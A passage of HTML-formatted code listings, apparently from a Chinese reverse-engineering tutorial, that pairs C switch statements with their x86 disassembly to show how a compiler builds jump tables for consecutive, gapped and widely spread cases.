class=\"line\">294</span><br><span class=\"line\">295</span><br><span class=\"line\">296</span><br><span class=\"line\">297</span><br><span class=\"line\">298</span><br><span class=\"line\">299</span><br><span class=\"line\">300</span><br><span class=\"line\">301</span><br><span class=\"line\">302</span><br><span class=\"line\">303</span><br><span class=\"line\">304</span><br><span class=\"line\">305</span><br><span class=\"line\">306</span><br><span class=\"line\">307</span><br><span class=\"line\">308</span><br><span class=\"line\">309</span><br><span class=\"line\">310</span><br><span class=\"line\">311</span><br><span class=\"line\">312</span><br><span class=\"line\">313</span><br><span class=\"line\">314</span><br><span class=\"line\">315</span><br><span class=\"line\">316</span><br><span class=\"line\">317</span><br><span class=\"line\">318</span><br><span class=\"line\">319</span><br><span class=\"line\">320</span><br><span class=\"line\">321</span><br><span class=\"line\">322</span><br><span class=\"line\">323</span><br><span class=\"line\">324</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//只要case连续且数目足够就会生成大表</span></span><br><span class=\"line\"><span class=\"comment\">//case连续没有空缺</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"type\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(x)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">301</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">302</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;2&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">303</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;3&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">304</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;4&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">305</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;5&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">306</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;6&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">307</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;7&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">308</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;8&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">309</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;9&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">310</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;A&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sb&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D7D0 <span class=\"number\">55</span>                   push        ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D1 <span class=\"number\">8B</span> EC                mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D3 <span class=\"number\">83</span> EC <span class=\"number\">44</span>             sub         esp,<span class=\"number\">44</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D6 <span class=\"number\">53</span>                   push        ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D7 <span class=\"number\">56</span>                   push        esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D8 <span class=\"number\">57</span>                   push        edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D9 <span class=\"number\">8</span>D <span class=\"number\">7</span>D BC             lea         edi,[ebp<span class=\"number\">-44</span>h]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7DC B9 <span class=\"number\">11</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       mov         ecx,<span class=\"number\">11</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E1 B8 CC CC CC CC       mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E6 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E8 <span class=\"number\">8B</span> <span class=\"number\">45</span> <span class=\"number\">08</span>             mov         eax,dword ptr [ebp+<span class=\"number\">8</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7EB <span class=\"number\">89</span> <span class=\"number\">45</span> FC             mov         dword ptr [ebp<span class=\"number\">-4</span>],eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D7EE <span class=\"number\">8B</span> <span class=\"number\">4</span>D FC             mov         ecx,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7F1 <span class=\"number\">81</span> E9 <span class=\"number\">2</span>D <span class=\"number\">01</span> <span class=\"number\">00</span> <span class=\"number\">00</span>    sub         ecx,<span class=\"number\">12</span>Dh</span><br><span class=\"line\"><span class=\"number\">0040</span>D7F7 <span class=\"number\">89</span> <span class=\"number\">4</span>D FC             mov         dword ptr [ebp<span class=\"number\">-4</span>],ecx</span><br><span class=\"line\"><span class=\"number\">0040</span>D7FA <span class=\"number\">83</span> <span class=\"number\">7</span>D FC <span class=\"number\">09</span>          cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">9</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7FE <span class=\"number\">0F</span> <span class=\"number\">87</span> A6 <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>    ja          $L551+<span class=\"number\">0F</span>h (<span class=\"number\">0040</span>d8aa)</span><br><span class=\"line\"><span class=\"number\">0040</span>D804 <span class=\"number\">8B</span> <span class=\"number\">55</span> FC             mov         edx,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D807 FF <span class=\"number\">24</span> <span class=\"number\">95</span> C8 D8 <span class=\"number\">40</span> <span class=\"number\">00</span> jmp         dword ptr [edx*<span class=\"number\">4</span>+<span class=\"number\">40</span>D8C8h]</span><br><span class=\"line\">$L533:</span><br><span class=\"line\"><span class=\"number\">0040</span>D80E <span class=\"number\">68</span> C0 <span class=\"number\">2F</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;1&quot;</span> (<span class=\"number\">00422f</span>c0)</span><br><span class=\"line\"><span class=\"number\">0040</span>D813 E8 <span class=\"number\">28</span> <span class=\"number\">39</span> <span class=\"function\">FF FF       call        <span class=\"title\">printf</span> <span class=\"params\">(<span class=\"number\">00401140</span>)</span></span></span><br><span class=\"line\"><span class=\"function\">0040D818 83 C4 04             add         esp,4</span></span><br><span class=\"line\"><span class=\"function\">0040D81B E9 97 00 00 00       jmp         $L551+1<span class=\"title\">Ch</span> <span class=\"params\">(<span class=\"number\">0040</span>d8b7)</span></span></span><br><span class=\"line\"><span class=\"function\">$L535:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D820 <span class=\"number\">68</span> BC <span class=\"number\">2F</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;2&quot;</span> (<span class=\"number\">00422f</span>bc)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D825 E8 <span class=\"number\">16</span> <span class=\"number\">39</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D82A <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D82D E9 <span class=\"number\">85</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       jmp         $L551+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d8b7)</span></span><br><span class=\"line\"><span class=\"function\">$L537:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D832 <span class=\"number\">68</span> B8 <span class=\"number\">2F</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;3&quot;</span> (<span class=\"number\">00422f</span>b8)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D837 E8 <span class=\"number\">04</span> <span class=\"number\">39</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D83C <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D83F EB <span class=\"number\">76</span>                jmp         $L551+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d8b7)</span></span><br><span class=\"line\"><span class=\"function\">$L539:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D841 <span class=\"number\">68</span> B4 <span class=\"number\">2F</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;4&quot;</span> (<span class=\"number\">00422f</span>b4)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D846 E8 F5 <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D84B <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D84E EB <span class=\"number\">67</span>                jmp         $L551+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d8b7)</span></span><br><span class=\"line\"><span class=\"function\">$L541:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D850 <span class=\"number\">68</span> <span class=\"number\">64</span> <span class=\"number\">2F</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;5&quot;</span> (<span class=\"number\">00422f</span>64)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D855 E8 E6 <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D85A <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D85D EB <span class=\"number\">58</span>                jmp         $L551+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d8b7)</span></span><br><span class=\"line\"><span class=\"function\">$L543:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D85F <span class=\"number\">68</span> <span class=\"number\">3</span>C <span class=\"number\">21</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;6&quot;</span> (<span class=\"number\">0042213</span>c)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D864 E8 D7 <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D869 <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D86C EB <span class=\"number\">49</span>                jmp         $L551+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d8b7)</span></span><br><span class=\"line\"><span class=\"function\">$L545:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D86E <span class=\"number\">68</span> <span class=\"number\">2</span>C <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;7&quot;</span> (<span class=\"number\">0042202</span>c)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D873 E8 C8 <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D878 <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D87B EB <span class=\"number\">3</span>A                jmp         $L551+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d8b7)</span></span><br><span class=\"line\"><span class=\"function\">$L547:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D87D <span class=\"number\">68</span> <span class=\"number\">28</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;8&quot;</span> (<span class=\"number\">00422028</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D882 E8 B9 <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D887 <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D88A EB <span class=\"number\">2B</span>                jmp         $L551+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d8b7)</span></span><br><span class=\"line\"><span class=\"function\">$L549:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D88C <span class=\"number\">68</span> <span class=\"number\">24</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;9&quot;</span> (<span class=\"number\">00422024</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D891 E8 AA <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D896 <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D899 EB <span class=\"number\">1</span>C                jmp         $L551+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d8b7)</span></span><br><span class=\"line\"><span class=\"function\">$L551:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D89B <span class=\"number\">68</span> <span class=\"number\">20</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;A&quot;</span> (<span class=\"number\">00422020</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8A0 E8 <span class=\"number\">9B</span> <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8A5 <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8A8 EB <span class=\"number\">0</span>D                jmp         $L551+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d8b7)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8AA <span class=\"number\">68</span> <span class=\"number\">1</span>C <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;sb&quot;</span> (<span class=\"number\">0042201</span>c)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8AF E8 <span class=\"number\">8</span>C <span class=\"number\">38</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8B4 <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8B7 <span class=\"number\">5F</span>                   pop         edi</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8B8 <span class=\"number\">5</span>E                   pop         esi</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8B9 <span class=\"number\">5B</span>                   pop         ebx</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8BA <span class=\"number\">83</span> C4 <span class=\"number\">44</span>             add         esp,<span class=\"number\">44</span>h</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8BD <span class=\"number\">3B</span> EC                cmp         ebp,esp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8BF E8 FC <span class=\"number\">38</span> FF FF       call        __chkesp (<span class=\"number\">004011</span>c0)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8C4 <span class=\"number\">8B</span> E5                mov         esp,ebp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8C6 <span class=\"number\">5</span>D                   pop         ebp</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8C7 C3                   ret</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8C8  <span class=\"number\">0</span>E D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  .谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8CC  <span class=\"number\">20</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>   谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8D0  <span class=\"number\">32</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  <span class=\"number\">2</span>谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8D4  <span class=\"number\">41</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  A谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8D8  <span class=\"number\">50</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  P谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8DC  <span class=\"number\">5F</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  _谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8E0  <span class=\"number\">6</span>E D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  n谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8E4  <span class=\"number\">7</span>D D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  &#125;谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8E8  <span class=\"number\">8</span>C D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  屫@.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8EC  <span class=\"number\">9B</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  涁@.</span></span><br><span class=\"line\"><span class=\"function\"></span></span><br><span class=\"line\"><span class=\"function\">    </span></span><br><span class=\"line\"><span class=\"function\">//case不连续且差值不大</span></span><br><span class=\"line\"><span class=\"function\">//如果中间出现不连续的case会用default补大表空缺 </span></span><br><span class=\"line\"><span class=\"function\">//空缺的地方会用case补，下面的两个<span class=\"number\">0040</span>D886</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8A4  <span class=\"number\">0</span>E D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  .谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8A8  <span class=\"number\">86</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  嗀@.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8AC  <span class=\"number\">86</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  嗀@.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8B0  <span class=\"number\">1</span>D D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  .谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8B4  <span class=\"number\">2</span>C D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  ,谸.</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D8B8  <span class=\"number\">3B</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  ;</span>谸.</span><br><span class=\"line\"><span class=\"number\">0040</span>D8BC  <span class=\"number\">4</span>A D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  J谸.</span><br><span class=\"line\"><span class=\"number\">0040</span>D8C0  <span class=\"number\">59</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  Y谸.</span><br><span class=\"line\"><span class=\"number\">0040</span>D8C4  <span class=\"number\">68</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  h谸.</span><br><span class=\"line\"><span class=\"number\">0040</span>D8C8  <span class=\"number\">77</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>  w谸.</span><br><span class=\"line\">    </span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">//如果case不连续且差值过大 使用大表加小表</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"type\">void</span> <span class=\"title\">func</span><span class=\"params\">(<span class=\"type\">int</span> x)</span></span></span><br><span class=\"line\"><span class=\"function\"></span>&#123;</span><br><span class=\"line\">\t<span class=\"keyword\">switch</span>(x)</span><br><span class=\"line\">\t&#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">301</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;1&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">308</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;8&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">309</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;9&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">case</span> <span class=\"number\">310</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;A&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t\t<span class=\"keyword\">default</span>:</span><br><span class=\"line\">\t\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;sb&quot;</span>);</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">break</span>;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"number\">0040</span>D7D0 <span class=\"number\">55</span>                   push        ebp</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D1 <span class=\"number\">8B</span> EC                mov         ebp,esp</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D3 <span class=\"number\">83</span> EC <span class=\"number\">44</span>             sub         esp,<span class=\"number\">44</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D6 <span class=\"number\">53</span>                   push        ebx</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D7 <span class=\"number\">56</span>                   push        esi</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D8 <span class=\"number\">57</span>                   push        edi</span><br><span class=\"line\"><span class=\"number\">0040</span>D7D9 <span class=\"number\">8</span>D <span class=\"number\">7</span>D BC             lea         edi,[ebp<span class=\"number\">-44</span>h]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7DC B9 <span class=\"number\">11</span> <span class=\"number\">00</span> <span class=\"number\">00</span> <span class=\"number\">00</span>       mov         ecx,<span class=\"number\">11</span>h</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E1 B8 CC CC CC CC       mov         eax,<span class=\"number\">0</span>CCCCCCCCh</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E6 F3 AB                rep stos    dword ptr [edi]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7E8 <span class=\"number\">8B</span> <span class=\"number\">45</span> <span class=\"number\">08</span>             mov         eax,dword ptr [ebp+<span class=\"number\">8</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7EB <span class=\"number\">89</span> <span class=\"number\">45</span> FC             mov         dword ptr [ebp<span class=\"number\">-4</span>],eax</span><br><span class=\"line\"><span class=\"number\">0040</span>D7EE <span class=\"number\">8B</span> <span class=\"number\">4</span>D FC             mov         ecx,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D7F1 <span class=\"number\">81</span> E9 <span class=\"number\">2</span>D <span class=\"number\">01</span> <span class=\"number\">00</span> <span class=\"number\">00</span>    sub         ecx,<span class=\"number\">12</span>Dh</span><br><span class=\"line\"><span class=\"number\">0040</span>D7F7 <span class=\"number\">89</span> <span class=\"number\">4</span>D FC             mov         dword ptr [ebp<span class=\"number\">-4</span>],ecx</span><br><span class=\"line\"><span class=\"number\">0040</span>D7FA <span class=\"number\">83</span> <span class=\"number\">7</span>D FC <span class=\"number\">09</span>          cmp         dword ptr [ebp<span class=\"number\">-4</span>],<span class=\"number\">9</span></span><br><span class=\"line\"><span class=\"number\">0040</span>D7FE <span class=\"number\">77</span> <span class=\"number\">4</span>E                ja          $L539+<span class=\"number\">0F</span>h (<span class=\"number\">0040</span>d84e)</span><br><span class=\"line\"><span class=\"number\">0040</span>D800 <span class=\"number\">8B</span> <span class=\"number\">45</span> FC             mov         eax,dword ptr [ebp<span class=\"number\">-4</span>]</span><br><span class=\"line\"><span class=\"number\">0040</span>D803 <span class=\"number\">33</span> D2                <span class=\"keyword\">xor</span>         edx,edx</span><br><span class=\"line\"><span class=\"number\">0040</span>D805 <span class=\"number\">8</span>A <span class=\"number\">90</span> <span class=\"number\">80</span> D8 <span class=\"number\">40</span> <span class=\"number\">00</span>    mov         dl,<span class=\"function\">byte <span class=\"title\">ptr</span>  <span class=\"params\">(<span class=\"number\">0040</span>d880)</span>[eax]   <span class=\"comment\">//内存0040d880中偏移量为[eax]的值</span></span></span><br><span class=\"line\"><span class=\"function\">0040D80B FF 24 95 6C D8 40 00 jmp         dword ptr [edx*4+40D86Ch]</span></span><br><span class=\"line\"><span class=\"function\">$L533:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D812 <span class=\"number\">68</span> <span class=\"number\">2</span>C <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;1&quot;</span> (<span class=\"number\">0042202</span>c)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D817 E8 <span class=\"number\">24</span> <span class=\"number\">39</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D81C <span class=\"number\">83</span> C4 <span class=\"number\">04</span>             add         esp,<span class=\"number\">4</span></span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D81F EB <span class=\"number\">3</span>A                jmp         $L539+<span class=\"number\">1</span>Ch (<span class=\"number\">0040</span>d85b)</span></span><br><span class=\"line\"><span class=\"function\">$L535:</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D821 <span class=\"number\">68</span> <span class=\"number\">28</span> <span class=\"number\">20</span> <span class=\"number\">42</span> <span class=\"number\">00</span>       push        offset string <span class=\"string\">&quot;8&quot;</span> (<span class=\"number\">00422028</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D826 E8 <span class=\"number\">15</span> <span class=\"number\">39</span> FF FF       call        printf (<span class=\"number\">00401140</span>)</span></span><br><span class=\"line\"><span class=\"function\"><span class=\"number\">0040</span>D82B <span 